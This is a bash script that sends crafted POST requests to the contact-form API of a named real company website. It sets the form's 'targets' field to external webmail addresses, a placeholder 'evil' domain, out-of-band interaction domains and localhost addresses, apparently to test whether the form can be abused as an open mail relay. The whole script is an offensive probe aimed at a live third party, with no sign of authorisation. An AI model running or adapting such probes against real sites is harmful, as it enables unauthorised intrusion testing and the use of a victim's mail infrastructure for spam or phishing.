#!/bin/bash
H="https://www.infinitycapital.bh"
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36'
t(){ echo -n "$2 -> "; curl -s -A "$UA" -X POST "$H/api/send" --max-time 25 \
 -F 'fname=A' -F 'lname=B' -F 'areacode=973' -F 'tel=3000000' -F 'cname=A' \
 -F 'subject=ICRELAY9' -F 'msg=probe' -F 'check=true' -F "targets=$1" | head -c 220; echo; }
t 'a@gmail.com'                'gmail(external)'
t 'a@protonmail.com'           'proton(external)'
t 'test@mailinator.com'        'mailinator(external)'
t 'a@evil-example.com'         'random external'
t 'info@infinitycapital.bh'   'company'
t 'info@mail.infinitycapital.bh' 'company subdomain'
t 'a@oast.abhedi.co.in'        'oob short'
t 'a@oobrelay1.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in' 'oob long'
t 'a@localhost'                'localhost'
t 'root@localhost'             'root@localhost'
echo DONE
